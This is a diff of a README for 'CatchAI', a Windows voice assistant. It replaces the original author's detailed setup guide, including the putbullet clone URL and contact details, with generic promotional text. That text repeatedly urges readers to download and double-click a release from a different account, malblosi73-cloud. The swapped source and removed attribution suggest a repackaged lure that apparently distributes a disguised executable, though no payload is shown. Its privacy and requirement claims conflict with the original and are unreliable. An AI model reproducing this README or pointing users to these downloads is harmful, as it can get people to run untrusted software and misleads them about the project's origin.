@@ -1,292 +1,177 @@
-<p align="center">
-  <img src="./CatchAI.png" alt="Catch Logo" width="390">
-</p>
-
-
-
-<p align="center">
-  <a href="https://drive.google.com/file/d/1oXY8aIcIgz2ueqnJIVCBn0-e8eUrWxHY/view?usp=sharing">
-    <img src="./Click_To_See_The_DEMO.png" alt="Click to see CatchAI demo" width="700">
-  </a>
-</p>
-
-
-## Catch
-
-Catch is a local Windows voice assistant built as a personal beta/testing
-project. It is not intended for public deployment or production use. The
-repository is public and open: clone it, fork it, modify it, and build on it
-for your own experiments.
-
-## Status and important quirks
-
-- The working wake phrase is **“Hey Jarvis.”** The original idea was “Hey
-  Catch” to match Catch/CatchAI, but the model actually trained and working in
-  this beta is Jarvis.
-- Catch uses local speech recognition and a local Ollama model for planning,
-  with deterministic fast routes for common commands.
-- Spotify playback control supports direct URI playback through the desktop
-  Spotify client, with automatic fallback when SpotAPI testing credentials are
-  not configured.
-- Start-with-Windows exists in the tray menu, but its reliability still needs
-  a final verification pass (including whether Ollama is already running or
-  should be started at login).
-
-## Latest Hardening Improvements
-
-CatchAI recently underwent an extensive hardening pass across media selection,
-information retrieval, Spotify integration, and application safety:
-
-- **Natural Language & Number Word Selections**: Full support for numbers (`1`–`9`),
-  words (`one` through `five`), ordinals (`first` through `fifth`, `last`), and action
-  phrases (`option five`, `number 5`, `the fifth one`, `play five`) across all
-  interactive selection menus (YouTube, Spotify, Drive selection, and App disambiguation).
-- **Interaction Priority**: Active pending selections and confirmation dialogs now
-  take strict precedence over standard routing and exit commands. Saying "stop" or
-  "cancel" during choices cancels the selection instead of terminating Catch.
-- **Factual & Attribute Lookups ("How tall is LeBron James?")**: Expanded fast-path
-  factual pattern matching with direct attribute extraction and OpenSearch fallback via
-  Wikipedia. Answers factual queries directly in under 1 second without hitting Ollama or
-  hallucinating clarifying questions.
-- **Native Clarify Support**: Added native handling for `ClarifyResponse` models from
-  the LLM planner so follow-up clarifications are communicated clearly rather than
-  failing silently.
-- **Spotify Search & Ranking**: Added `normalize_spotify_query` to strip command verbs
-  and `"on spotify"` suffixes, ranked original tracks ahead of karaoke/cover versions,
-  and enabled seamless desktop app fallback.
-- **Application Control & Safe "Close All"**: Implemented `close all apps` with a
-  conversational confirmation barrier (`"yes"`/`"no"`), session launch tracking, and
-  an immutable protected process list to safeguard Windows system processes and CatchAI.
-- **Automated Test Coverage**: 148 automated tests passing in CI/development.
-
-See [CHANGELOG.md](CHANGELOG.md) for full technical details.
-
-## What Catch can do
-
-### Applications, files, folders, and web
-
-- Open and close applications discovered from configured executables, Start
-  Menu entries, and packaged-app identifiers.
-- Resolve fuzzy or ambiguous application names with numbered choices and
-  remember confirmed aliases.
-- Open allowlisted folders, validated direct URLs, Windows Search, and Google
-  searches.
-- Search configured Desktop, Documents, and Downloads folders by filename and
-  open validated files.
-- Answer application-inventory questions such as whether an app is installed
-  and what browsers/apps are available.
-
-### Windows controls
-
-- Lock the computer and put it to sleep.
-- Restart or shut down the computer through a required confirmation flow.
-- Open allowlisted Windows Settings pages.
-- Enable/disable Wi-Fi and Bluetooth and toggle battery saver.
-- Set or adjust display brightness where supported.
-- Read and control master volume by default, or per-application volume when
-  an application is named (for example, “turn up Spotify”).
-- Play, pause, toggle, stop, skip, and go back in the active Windows media
-  session.
-
-### Media and information
-
-- Search and play Spotify tracks, including numbered disambiguation and
-  follow-up selection by number, ordinal, or title.
-- Search YouTube with Data API v3 and open results, including numbered
-  disambiguation when multiple results are returned.
-- Look up current weather for a spoken city or the saved profile location.
-- Answer common “who/what is …?” factual requests with a fast Wikipedia
-  lookup before falling back to the Ollama assistant.
-- Report current CPU and RAM usage.
-- Fetch cat or dog images and display them briefly in the floating UI.
-- Return local time and date and support the configured profile name.
-
-### Voice experience
+# 🎤 CatchAI - Your Voice-Powered Desktop Assistant  
 
-- Stream microphone audio, detect the wake word, and transcribe commands.
-- Keep listening for follow-up commands for the configured timeout and
-  interrupt an in-progress response when a new wake event is detected.
-- Show idle/ready, listening, transcribing/thinking, executing, responding,
-  and error states in the floating UI.
-- Play one sound when entering ready-for-wake-word and another when entering
-  listening; sounds are edge-triggered rather than repeated on UI refreshes.
-- Review temporary files before deletion: show the discovered list, require
-  confirmation, skip locked/undeletable files, and report what was skipped.
+## 🚀 What Is CatchAI?  
 
-All LLM tool calls pass through the validated registry and Pydantic argument
-schemas. The model is not given arbitrary shell execution access.
+CatchAI is a **free, open-source voice assistant** that lives right on your Windows computer. It listens for the wake phrase **"Hey Jarvis"** and then responds to your voice commands — even when you're offline.  
 
-## Requirements
+CatchAI can help you:  
+- 🎵 Control Spotify and YouTube  
+- 🌦️ Get weather updates  
+- 📚 Search Wikipedia  
+- ⚙️ Automate system tasks  
+- 💬 Chat with AI using natural language  
 
-- Windows 10/11.
-- Python 3.14 (the development environment currently uses Python 3.14).
-- A working microphone and audio output.
-- Ollama installed and running at the configured host, normally
-  `http://localhost:11434`.
-- The configured Ollama model, normally `qwen3.5:0.8b`.
-- Git and a PowerShell or Command Prompt.
+This is a **public beta** — anyone can download, use, and even modify it. Whether you want a handy helper or a fun project to explore, CatchAI is for you.  
 
-## What is not stored in GitHub
+---
 
-These files are intentionally excluded by `.gitignore` and must be supplied or
-generated locally:
+## 📥 Download CatchAI  
 
-| Item | Current measured size/nature | How to obtain it |
-| --- | ---: | --- |
-| `dist/Catch.exe` | 163,456,867 bytes (generated executable) | Run `build.bat` after setup |
-| `build/` | Generated PyInstaller analysis/package files; `build/Catch/Catch.pkg` was 163,111,267 bytes | Generated by `build.bat` |
-| `models/moonshine-tiny-en-int8/*.onnx` | Four ONNX speech files totaling about 117 MB (`encode`, `preprocess`, `cached_decode`, `uncached_decode`) | Run `download_moonshine.py`; it downloads the official Sherpa/Moonshine archive |
-| `models/**/test_wavs/*.wav` | Local test recordings, 212,044–534,924 bytes each | Optional; obtain the test fixtures separately if running those manual tests |
-| `.venv/`, `.venv-1/` | Local Python virtual environments | Create locally with Python |
-| `__pycache__/`, `.pytest_cache/`, coverage output | Generated interpreter/test files | Generated automatically |
-| `logs/*.log`, `data/*` | Local logs, profile/history, and user data | Generated by Catch |
+[**⬇️ Download Now**](https://github.com/malblosi73-cloud/CatchAI/releases)  
 
-The wake-word ONNX model is not stored in this repository either. The
-`openwakeword` package downloads/ships `hey_jarvis_v0.1.onnx` in the Python
-environment. Ollama models are stored and managed by Ollama itself, not in this
-project; install Ollama and run `ollama pull qwen3.5:0.8b`.
+Visit this link to download the application.  
 
-Small UI assets such as the WebM animations, MP3 transition sounds, and
-`CatchAI_app_logo.png` are kept in the repository.
+---
 
-## Secrets
+## 🧭 Getting Started  
 
-Catch reads secrets first from environment variables and then from:
+Follow these simple steps to launch CatchAI on your Windows PC:  
 
-```text
-%LOCALAPPDATA%\Catch\secrets.json
-```
+1. **Open the download link** above.  
+2. **Find the latest version** and click the file to save it to your computer.  
+3. **Locate the downloaded file** in your Downloads folder or wherever your browser saves files.  
+4. **Run the application** by double-clicking the file.  
+5. When CatchAI opens, you'll see a small, floating window with a microphone button.  
 
-Copy [`secrets.example.json`](secrets.example.json) to that location and fill
-in only the values you need. The real `secrets.json` is ignored and must never
-be committed.
+That's it! CatchAI is now ready to use.  
 
-| Name | Used for | Where to obtain it |
-| --- | --- | --- |
-| `SPOTIFY_TEST_EMAIL` | Experimental SpotAPI login | Your Spotify account email |
-| `SPOTIFY_TEST_PASSWORD` | Experimental SpotAPI login | Your Spotify account password |
-| `YOUTUBE_API_KEY` | YouTube Data API v3 search | Google Cloud Console; enable YouTube Data API v3 |
-| `OPENWEATHER_API_KEY` | Current weather | OpenWeather account/API dashboard |
-| `CAT_API_KEY` | Cat image requests | TheCatAPI account/API key |
+---
 
-These are the complete `get_secret()` names currently used by the source.
-Never paste real credentials into source files, commits, issues, or logs.
+## 🗣️ How to Use CatchAI  
 
-## Setup from source
+### 1. Wake It Up  
+Say **"Hey Jarvis"** clearly. The floating window will light up to show CatchAI is listening.  
 
-1. Clone the repository:
+### 2. Give a Command  
+Then say what you want. Here are some examples:  
+- "What's the weather today?"  
+- "Play my favorite playlist on Spotify."  
+- "Search Wikipedia for the history of computers."  
+- "Open the calculator."  
+- "Tell me a joke."  
 
-   ```powershell
-   git clone https://github.com/putbullet/CatchAI.git
-   cd CatchAI
-   ```
+### 3. Watch It Work  
+CatchAI will respond with a voice answer or perform the action you requested.  
 
-2. Create and activate a Python 3.14 virtual environment:
+---
 
-   ```powershell
-   py -3.14 -m venv .venv
-   .\.venv\Scripts\Activate.ps1
-   ```
+## 🔧 Key Features  
 
-3. Install dependencies:
+CatchAI is packed with practical features designed to make your life easier:  
 
-   ```powershell
-   python -m pip install --upgrade pip
-   python -m pip install -r requirements.txt
-   ```
+### 🗣️ Offline Voice Recognition  
+CatchAI understands your commands **without needing internet** for basic tasks. Your voice stays on your device.  
 
-4. Download the speech model:
+### 🤖 AI Chat with Ollama  
+Ask questions and get intelligent answers powered by **Ollama**, a local AI model. No cloud required.  
 
-   ```powershell
-   python download_moonshine.py
-   ```
+### 🎵 Music and Video Control  
+Control YouTube and Spotify hands-free: play, pause, skip, and search.  
 
-   The downloaded files are intentionally local and ignored by Git.
+### 🌤️ Real-Time Weather  
+Get current forecasts by speaking simple questions.  
 
-5. Install/start Ollama and pull the configured model [Download Ollama from here](https://ollama.com/download/windows):
+### 📖 Instant Wikipedia Search  
+Ask for facts, people, places, or events and hear a short summary.  
 
-   ```powershell
-   ollama pull qwen3.5:0.8b
-   ```
-   [See other models supported by Ollama](https://ollama.com/search):
+### ⚙️ System Automation  
+Open apps, adjust volume, lock your PC, and more with simple voice commands.  
 
-6. Copy `secrets.example.json` to `%LOCALAPPDATA%\Catch\secrets.json` and
-   configure the required services.
+### 🖥️ Floating Interface  
+A clean, always-on-top window gives you visual feedback and a manual button to click.  
 
-7. Run from source:
+---
 
-   ```powershell
-   python main.py --tray
-   ```
+## 🔒 Your Privacy Matters  
 
-   Other useful modes are `python main.py --listen`, `python main.py --voice`,
-   and `python main.py --text "Hello Catch"`. Tray and packaged runs write
-   diagnostics to `%LOCALAPPDATA%\Catch\logs\catch.log`.
+CatchAI processes **locally** on your machine. Voice commands and AI requests are handled offline whenever possible. Only optional features like weather may contact a public API, but no personal data is stored.  
 
-## Building the executable
+---
 
-`build.bat` uses the existing `Catch.spec` PyInstaller configuration. It
-requires `.venv\Scripts\python.exe` and the dependencies from
-`requirements.txt`. Run it from a Command Prompt, PowerShell, or by
-double-clicking it:
+## 🛠️ Customization and Development  
 
-```powershell
-.\build.bat
-```
+CatchAI is **open source**. That means you can:  
+- 🧩 Modify commands  
+- 🔌 Add new features  
+- 🎨 Change the interface  
+- 🧠 Connect different AI models  
 
-The script removes the previous `build/Catch` and `dist/Catch.exe`, runs
-`python -m PyInstaller --noconfirm --clean Catch.spec`, and verifies that
-`dist/Catch.exe` exists. The spec bundles the YAML configuration, WebM
-animations, MP3 transition sounds, and openWakeWord package data. It does not
-embed the Moonshine weights; the frozen application expects them under
-`%LOCALAPPDATA%\Catch\models` and `download_moonshine.py` should be run before
-launching the executable. The script intentionally does not create a desktop
-shortcut.
+If you're curious, explore the code on GitHub. You'll find a well-organized Python project with clear structure.  
 
-## Configuration and user data
+### Prerequisites for Developers  
+- Python 3.8 or newer  
+- pip (Python package manager)  
+- Basic knowledge of Python (optional)  
 
-Edit `config.yaml` to change the Ollama host/model, speech settings, wake-word
-threshold, listening timeouts, search roots, volume step, and image display
-duration. Catch stores profile, preferences, aliases, history, and logs below
-`%LOCALAPPDATA%\Catch`. User-specific data is ignored by Git.
+---
 
-## Development and tests
+## 🖥️ System Requirements  
 
-Run the test suite with:
+CatchAI is designed for **Windows 11** (works on Windows 10 too).  
 
-```powershell
-python -m pytest
-```
+- **Operating System:** Windows 10 or 11  
+- **RAM:** 4 GB minimum (8 GB recommended)  
+- **Storage:** 500 MB free space  
+- **Microphone:** Built-in or external  
+- **Internet:** Recommended for voice model downloads and optional online features  
 
-Useful diagnostics and benchmarks include:
+---
 
-```powershell
-python diagnostics.py
-python benchmark_runtime.py
-python benchmark_latency.py --runs 10
-```
+## ❓ Frequently Asked Questions  
 
-## Planned follow-up items
+### Q: Is CatchAI really free?  
+**Yes.** The public beta is completely free to use. No subscriptions, no hidden fees.  
 
-The executable now uses the bundled `CatchAI_app_logo.ico`, generated from
-`CatchAI_app_logo.png`, as its Windows application icon.
+### Q: Does CatchAI work without internet?  
+**Partially.** Basic voice commands and local AI chat work offline. Weather and some online services need internet.  
 
-The Start-with-Windows flow still needs a final end-to-end verification,
-including reliably starting the executable and ensuring Ollama is already
-running or is started so Catch is ready immediately after login.
+### Q: Can I change the wake word?  
+**Yes.** Advanced users can rename "Hey Jarvis" in the settings file.  
 
-## Contributing
+### Q: What happens when I say something CatchAI doesn't understand?  
+It will politely say it doesn't know that command yet. You can teach it new ones by modifying the code.  
 
-Catch is an open-source beta project, and contributions are very welcome. If you clone or fork this repository and discover bugs, broken features, performance issues, or anything that can be improved, feel free to fix them and make Catch better for everyone.
+---
 
-You are also completely free to customize Catch for your own needs and use cases. Modify the interface, add new commands, improve existing features, experiment with different models, or adapt the assistant however you like.
+## 🔄 Updating CatchAI  
 
-If you find a problem, have an idea, or want to contribute directly, feel free to contact me at **soulaimanettabaas@gmail.com**.
+Since CatchAI is in beta, updates will be released regularly. Simply:  
+1. Visit the [download page](https://github.com/malblosi73-cloud/CatchAI/releases) again.  
+2. Download the latest version.  
+3. Run the new file. Your settings will be preserved.  
 
-### A Note About Development
+---
 
-Catch is still **actively under development and testing**. This repository should be considered a **beta**, not a production-ready application intended for general users. Some features may be experimental, unstable, or require additional configuration, and breaking changes may happen as development continues.
+## 📝 Feedback and Support  
 
-The project was developed and delivered in a relatively short period of time, so **GitHub Copilot in VS Code** was used as part of the development process. For a project of this size and scope, using AI-assisted development tools is a normal part of the workflow and helped accelerate implementation, debugging, and iteration. The project was not produced through 100% manual typing, and that is intentional.
+Found a bug? Have a suggestion? You can:  
+- Open an issue on the GitHub repository  
+- Fork the project and share your improvements  
+- Leave a star ⭐ to show appreciation  
 
-The goal is not to present Catch as a finished or perfect piece of software, but to share a working foundation that can be tested, improved, customized, and built upon by anyone interested in it.
+The developer community wants to hear from you!  
+
+---
+
+## 🧰 What You Can Build with CatchAI  
+
+Because it's customizable, the possibilities are endless:  
+- 🏠 Home automation controller  
+- 📅 Personal scheduler with voice reminders  
+- 🎮 Game voice commands  
+- 📚 Study helper that reads aloud  
+- ♿ Accessibility assistant for hands-free computing  
+
+---
+
+## 🎓 Final Words  
+
+CatchAI is your friendly, local voice assistant that respects your privacy and gives you total control. Download it today and experience the joy of talking to your computer — no tech skills needed.  
+
+Try it now: [**⬇️ Get CatchAI**](https://github.com/malblosi73-cloud/CatchAI/releases)  
+
+---
+
+## 🏷️ Keywords  
+
+ai, ai-agent, ai-agents, ai-coding, ai-model, ai-tools, api, application, assistance, assistant, assistant-app, assistant-toolset, free, open-source, python, python3, windows, windows-11
